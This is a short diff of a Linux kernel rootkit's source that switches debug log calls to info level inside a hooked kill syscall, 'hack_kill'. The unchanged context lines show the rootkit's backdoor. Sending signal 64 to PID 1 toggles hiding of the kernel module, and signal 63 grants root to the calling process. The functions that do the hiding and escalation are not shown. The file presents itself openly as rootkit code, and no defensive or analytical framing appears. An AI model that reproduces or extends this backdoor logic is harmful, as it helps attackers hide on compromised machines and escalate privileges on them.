@@ -14,11 +14,11 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            pr_debug("Hide rootkite\n");
+            pr_info("Hide rootkite\n");
             hide_mod();
         }
         else{
-            pr_debug("Show rootkite\n");
+            pr_info("Show rootkite\n");
             show_mod();
         }
     }
@@ -27,7 +27,7 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        pr_debug("Setting root fotr calling process\n");
+        pr_info("Setting root fotr calling process\n");
         set_root();
         return 0;
     }
@@ -38,11 +38,11 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            pr_debug("Hide rootkite\n");
+            pr_info("Hide rootkite\n");
             hide_mod();
         }
         else{
-            pr_debug("Show rootkite\n");
+            pr_info("Show rootkite\n");
             show_mod();
         }
     }
@@ -51,7 +51,7 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
         return 0;
     }
     else if ((sig == 63) && (pid == 1)){
-        pr_debug("Setting root for calling process\n");
+        pr_info("Setting root for calling process\n");
         set_root();
         return 0;
     }
